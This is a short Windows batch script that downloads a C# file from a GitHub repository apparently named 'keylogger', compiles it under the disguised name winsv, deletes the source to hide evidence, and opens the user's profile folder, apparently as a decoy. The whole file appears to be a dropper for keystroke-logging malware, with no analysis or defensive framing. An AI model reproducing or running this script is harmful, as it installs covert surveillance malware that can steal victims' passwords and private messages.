@echo off
curl -O https://raw.githubusercontent.com/w3irdguy/keylogger/main/winsv.cs
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe winsv.cs
erase winsv.cs & explorer %userprofile%
